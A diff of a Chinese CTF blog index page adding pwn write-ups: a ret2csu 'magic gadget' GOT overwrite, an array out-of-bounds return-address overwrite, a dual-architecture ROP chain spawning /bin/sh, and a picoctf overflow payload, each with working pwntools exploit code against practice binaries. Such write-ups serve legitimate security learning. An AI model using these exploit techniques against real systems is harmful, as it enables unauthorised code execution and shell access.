@@ -155,6 +155,387 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/29/Magic-gadget/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/29/Magic-gadget/" class="post-title-link" itemprop="url">Magic-gadget</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-29 13:03:35" itemprop="dateCreated datePublished" datetime="2022-01-29T13:03:35+08:00">2022-01-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-28 16:29:12" itemprop="dateModified" datetime="2022-06-28T16:29:12+08:00">2022-06-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>如果一个程序是用 g++ 编译的，则会存在如下gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add dword ptr [rbp - 0x3b],ebx;</span><br><span class="line">nop dword ptr [rax + rax];</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>这个gadget基本出现在<code>__do_global_dtors_au</code>这个函数里面，然而一般ida打开，点开这个函数但是看不到这个gadget，原因是因为这个gadget是通过错位得到的。</p>
+<p>一般可以通过ROPgadget来搜索得到，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary cscctf_2019_qual_signal| grep ret | grep &quot;\[rbp&quot; </span><br><span class="line">0x0000000000400618 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004006dc : mov eax, dword ptr [rbp - 0x108] ; leave ; ret</span><br><span class="line">0x00000000004006db : mov rax, qword ptr [rbp - 0x108] ; leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>在存在溢出的情况下，可以使用ret2csu来控制rbp与rbx，结合如上gadget就可以实现任意地址写。</p>
+<p>值得注意的是，因为这个gadget是<code>add</code>，所以有时它可以帮助我们在不泄露libc的情况下实现指定的修改，我们只需要知道偏移就可以了</p>
+<h3 id="cscctf-2019-qual-signal"><a href="#cscctf-2019-qual-signal" class="headerlink" title="cscctf_2019_qual_signal"></a>cscctf_2019_qual_signal</h3><p>程序保护如下</p>
+<img src="/2022/01/29/Magic-gadget/%E2%91%A0-checksec.png" class>
+
+<p>程序主逻辑如下</p>
+<img src="/2022/01/29/Magic-gadget/%E2%91%A0-main.jpg" class>
+
+<p>可见是一个简单的栈溢出，但是程序中没有使用输出函数，所以如果要泄漏libc的话会比较麻烦</p>
+<p>我们注意到程序中有 <code>__do_global_dtors_au</code>这个函数，所以我们用ROPgadget搜索一下那个gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary cscctf_2019_qual_signal| grep ret | grep &quot;\[rbp&quot; </span><br><span class="line">0x0000000000400618 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004006dc : mov eax, dword ptr [rbp - 0x108] ; leave ; ret</span><br><span class="line">0x00000000004006db : mov rax, qword ptr [rbp - 0x108] ; leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>因为got表是可写的，所以我们可以选择利用这个gadget来将某个函数的got表改成one_gadget即可。</p>
+<p>因为用one_gadget找的时候默认的都不太符合条件，所以加个 -l2 的参数来找</p>
+<img src="/2022/01/29/Magic-gadget/%E2%91%A0-one_gadget.png" class>
+
+<p>可见 0xe569f 处的 one_gadget 是我们能用的，因为 ret2csu 的时候我们可以顺便控制 r12 和 r14。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26066</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">csu = <span class="number">0x40074A</span></span><br><span class="line">one_gadget = <span class="number">0xe569f</span>-<span class="number">0x110070</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">payload += p64(<span class="number">0x40074A</span>)</span><br><span class="line">payload += p64(one_gadget&amp;<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>]+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x400618</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>稍微解释一下exp，这里选择了修改read函数的got表，所以我们首先算出read函数跟libc基址的偏移，然后用one_gadget的偏移 - read的偏移，这样用<code>add</code>加上read的got表之后，得到的就是one_gadget的地址了。</p>
+<p>因为 <code>0xe569f-0x110070</code> 是负数，我们不能直接将负数赋值给一个寄存器，所以我们可以用 <code>&amp;0xffffffffffffffff </code>这样的方法来表示一个负数，或者也可以 <code>+0x10000000000000000</code> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/18/qctf2018-stack2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/18/qctf2018-stack2/" class="post-title-link" itemprop="url">qctf2018_stack2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-18 15:10:13" itemprop="dateCreated datePublished" datetime="2022-01-18T15:10:13+08:00">2022-01-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-22 02:31:08" itemprop="dateModified" datetime="2022-02-22T02:31:08+08:00">2022-02-22</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>数组越界、找返回地址</p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下：</p>
+<img src="/2022/01/18/qctf2018-stack2/checksec.jpg" class>
+
+<p>程序主逻辑如下：</p>
+<img src="/2022/01/18/qctf2018-stack2/main-1.jpg" class>
+
+<img src="/2022/01/18/qctf2018-stack2/main-2.jpg" class>
+
+<img src="/2022/01/18/qctf2018-stack2/main-3.jpg" class>
+
+<p>简单分析可知问题出在这</p>
+<img src="/2022/01/18/qctf2018-stack2/%E5%88%86%E6%9E%90-1.jpg" class>
+
+<p>因为没对输入做限制，所以这里存在数组越界漏洞，且程序本身已给后门函数</p>
+<img src="/2022/01/18/qctf2018-stack2/backdoor.jpg" class>
+
+<p>那么我们只需要利用数组越界将 <code>main()</code> 函数返回地址改成后门函数地址即可，我们观察<code>main()</code>函数的栈空间可知数组<code>v13</code>与<code>ebp</code>相差<code>0x70</code>个字节</p>
+<img src="/2022/01/18/qctf2018-stack2/stack.jpg" class>
+
+<p>正常情况下<code>main()</code>函数被调用后<code>main()</code>函数随即创建其栈帧，所以返回地址一般在<code>ebp + 4</code>处，但是我们观察<code>main()</code>函数开头的汇编指令可知<code>main()</code>函数在创建其栈帧前还多了几步操作，这使得返回地址离ebp的距离有所不同</p>
+
+
+<p>上图汇编使得esp先减少了其最低4位的位置，然后压栈的操作使esp再-4，我们知道ASLR对栈的地址随机化是对低4位对齐，所以不会影响到其最低4位，那么我们只需要在<code>main()</code>函数入口打个断点，查看esp的初始位置的最低4位，即可算出返回地址相对于ebp的距离</p>
+<img src="/2022/01/18/qctf2018-stack2/%E5%88%86%E6%9E%90-3.jpg" class>
+
+<p>可以看到esp的最低4位是c，所以最后ebp相对于返回地址的距离为<code>0xc + 0x4 + 0x4 = 0x14</code>个字节，故数组v13相对与返回地址的距离为<code>0x14 + 0x70 = 0x84</code>个字节。</p>
+<p>其实也可以不必这么繁琐的计算，只要让程序跑到将ebp压栈完之后，再查看返回地址与ebp的偏移即可</p>
+<img src="/2022/01/18/qctf2018-stack2/%E5%88%86%E6%9E%90-4.jpg" class>
+
+<p>最后只需要修改返回地址即可，v13为char类型数组，所以我们一次修改一个字节，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x0804859B</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x84</span>,<span class="number">0x9B</span>)</span><br><span class="line">write(<span class="number">0x85</span>,<span class="number">0x85</span>)</span><br><span class="line">write(<span class="number">0x86</span>,<span class="number">0x04</span>)</span><br><span class="line">write(<span class="number">0x87</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>另外本题的远程因为出题人没将dash配置到环境中，所以我们无法直接调用 <code>/bin/dash</code> ，但是问题不大，因为程序本身调用了<code>system()</code> 函数，且有 <code>sh</code> 字符串，所以我们将返回地址修改到 <code>call _system</code> 处，再将 <code>sh</code>作为其参数即可</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/" class="post-title-link" itemprop="url">强网杯2019-拟态STKOF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-14 16:49:09 / 修改时间：17:43:38" itemprop="dateCreated datePublished" datetime="2022-01-14T16:49:09+08:00">2022-01-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下：</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/checksec.jpg" class>
+
+<p>32位程序的主逻辑如下：</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32main.png" class>
+
+<p>64位程序的主逻辑如下：</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64main.jpg" class>
+
+<p>这是一道拟态的题目，给了两个二进制文件，分别是32位和64位的，两个程序功能完全相同。题目会同时启动32位和64位程序，然后将我们的输入分别传给这两个进程，并检测两个程序的输出，若两个程序输出不同或者其中一个程序崩溃则会判断为<code>check down</code>，直接断开连接，只有两个程序的输出一致且都不崩溃时，才能通过检查。所以我们需要构造一条在两个程序中都能getshell的payload。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>显然两个程序的漏洞都为栈溢出，且在64位程序中 <code>buf</code> 到 <code>rbp</code> 的距离为 <code>0x110</code> ，而在32为程序中 <code>buf</code> 到 <code>ebp</code>的距离为 <code>0x10C</code> ，所以对于同一条payload而言，64位程序的padding就为 <code>0x118</code> 个字节，而32位程序的padding为 <code>0x110</code> 个字节。因为这两个程序都是静态链接的程序，所以我们基本可以找到所需要的gadget来执行syscall，我们利用 <code>add_sp_ret</code> 这样的gadget来分别抬高两个程序中的sp寄存器，这样就能在栈上分别布置32位和64位的ROPchain，且使两个程序只执行对应的ROPchain。</p>
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/32add.jpg" class>
+
+<img src="/2022/01/14/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E6%8B%9F%E6%80%81STKOF/64add.jpg" class>
+
+<p>因为32位程序会先<code>ret</code>（<code>buf</code>到<code>ret</code>的距离较短），所以我们原本可以利用32位程序中的<code>add_sp_ret</code>来抬栈从而使32位程序的执行流直接跳过64位的ROPchain，但是32位程序中没有能将 esp 直接抬高这么多的 gadget，所以这种思路不可行，但是这不重要，只要我们能将 esp 抬高到跳过64位程序的 ret 就行，然后我们使64位程序的 ret 同样布置为 <code>add_sp_ret</code> 这样的gadget，来使这条payload在64位程序中的执行流跳过32位程序的ROPchain即可。同时因为程序中没有 <code>/bin/sh</code> 字符串，所以我们还需要往程序里手动写入。结合exp来理解即可，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28385</span>)</span><br><span class="line">elf32 = ELF(<span class="string">&quot;./32&quot;</span>)</span><br><span class="line">elf64 = ELF(<span class="string">&quot;./64&quot;</span>)</span><br><span class="line"></span><br><span class="line">add_esp_0x20 = <span class="number">0x080a69f2</span></span><br><span class="line">add_rsp_0x58 = <span class="number">0x43b979</span></span><br><span class="line"></span><br><span class="line">sh32 = <span class="number">0x80AEEBD</span></span><br><span class="line">sh64 = <span class="number">0x48D2AC</span></span><br><span class="line">bss64 = <span class="number">0x6A330F</span></span><br><span class="line">bss32 = <span class="number">0x80DA32F</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080a8af6</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e9f1</span></span><br><span class="line">int80 = <span class="number">0x080495a3</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdi = <span class="number">0x4005f6</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x43d9f9</span></span><br><span class="line">syscall = <span class="number">0x461645</span></span><br><span class="line"><span class="comment">#rop of 32</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x110</span></span><br><span class="line">payload += p32(add_esp_0x20) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p64(add_rsp_0x58)</span><br><span class="line">payload = payload.ljust(<span class="number">0x134</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(elf32.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(bss32) + p32(<span class="number">0x10</span>)</span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss32) + p32(int80)</span><br><span class="line"><span class="comment">#rop of 64</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x168</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss64) + p64(elf64.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(bss64) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/picoctf-2018-buffer-overflow-0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/17/picoctf-2018-buffer-overflow-0/" class="post-title-link" itemprop="url">picoctf_2018_buffer_overflow_0</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-17 21:21:53" itemprop="dateCreated datePublished" datetime="2021-12-17T21:21:53+08:00">2021-12-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-12-18 15:18:44" itemprop="dateModified" datetime="2021-12-18T15:18:44+08:00">2021-12-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ol>
+<li><p>signal() 函数：signal ( 参数1，参数2 )，参数1：要进行处理的信号。参数2：处理的方式。</p>
+<p>关于系统信号可以在终端输入 <code>kill -l</code> 查看，如下</p>
+</li>
+<li><p>main(int argc,char *argv[]) ，argc 和 argv[] 为命令行参数</p>
+<p>① argc为整数，表示由操作系统传来的参数（也是传入main函数的参数）的个数</p>
+<p>② argv[] 为指针数组，其存储着指向由操作系统传来的参数（也是传入main函数的参数）的地址的指针</p>
+<p>③argc最小为 1，因为 argv[0] 正常情况下存储程序的名称，并且包含了程序所在的完整路径。</p>
+<p>例子：</p>
+<p>假如程序的名称为 guess：则当我们输入 <code>./guess</code> 时，argc = 1，表示由操作系统传来的参数只有一个，argv[0] 指向输入的程序路径及名称 “./guess”</p>
+<p>当我们输入 <code>./guess 123</code> 时，argc = 2，表示由操作系统传来的参数由两个，argv[0] 指向输入的程序路径及名称，argv[1] 指向第二个参数 “123” 字符串的地址。</p>
+</li>
+</ol>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>题目提示要用ssh登入，但我们先下载程序文件做完分析工作</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-1.jpg" class>
+
+<p>例行检查保护</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/checksec.jpg" class>
+
+<p>main函数如下</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/main.png" class>
+
+<p>注意到 signal() 函数，我们查看 sigsegv_handler() 函数</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/sigsegv_handler.jpg" class>
+
+<p>所以如果我们触发了11号系统信号就直接能获得 flag 了，我们在终端输入 <code>kill -l</code> 查看系统信号</p>
+
+
+<blockquote>
+<p>引用百度百科关于11号系统信号的介绍：</p>
+<p>在POSIX兼容的平台上，<strong>SIGSEGV</strong>是当一个进程执行了一个无效的内存引用，或发生<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%AE%B5%E9%94%99%E8%AF%AF/7896410">段错误</a>时发送给它的信号。SIGSEGV的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E5%B8%B8%E9%87%8F/1666578">符号常量</a>在头文件signal.h中定义。因为在不同平台上，信号数字可能变化，因此符号信号名被使用。通常，它是信号#11。</p>
+</blockquote>
+<p>所以只要我们只要让程序执行一个无效的内存引用即可。</p>
+<p>程序没有给输入函数，但是 vuln() 函数将 argv[1] 作为参数，说明我们需要在命令行中传入我们的输入作为参数。我们查看 vuln() 函数</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/vuln.jpg" class>
+
+<p>可以看到这里存在栈溢出漏洞，那么只要我们输入直到覆盖栈上的返回地址为一个无效值即可让 signal() </p>
+<p>函数执行 sigsegv_handler() 函数打印出flag了。</p>
+<p>ssh连上： <code>ssh -p 28312 CTFMan@node4.buuoj.cn</code> </p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-2.png" class>
+
+
+
+<p>同理，其实我们也可以不依靠 sigsegv_handler() 函数，只要我们覆盖返回地址来调用 puts() 函数，再把 flag 所在地址作为参数，同样也可以打印出flag。</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/puts.jpg" class>
+
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/flag.png" class>
+
+<p>所以payload = ‘a’*0x1c + \xC0\x84\x04\x08 + \x00\x00\x00\x00 + \x80\xA0\x04\x08</p>
+<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-4.jpg" class>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/shellcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -733,396 +1114,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/06/SROP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/06/SROP/" class="post-title-link" itemprop="url">SROP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-06 21:43:55" itemprop="dateCreated datePublished" datetime="2021-12-06T21:43:55+08:00">2021-12-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-17 20:34:40" itemprop="dateModified" datetime="2021-12-17T20:34:40+08:00">2021-12-17</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SROP（没写完）"><a href="#SROP（没写完）" class="headerlink" title="SROP（没写完）"></a>SROP（没写完）</h2><h4 id="一些比较好的文章"><a href="#一些比较好的文章" class="headerlink" title="一些比较好的文章"></a>一些比较好的文章</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85810">【技术分享】Sigreturn Oriented Programming攻击简介 - 安全客，安全资讯平台 (anquanke.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luozhaotian/article/details/79607572"> SROP基本原理和利用</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1081">SROP_「二进制安全pwn基础」 - 网安 (wangan.com)</a></p>
-<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]</a></p>
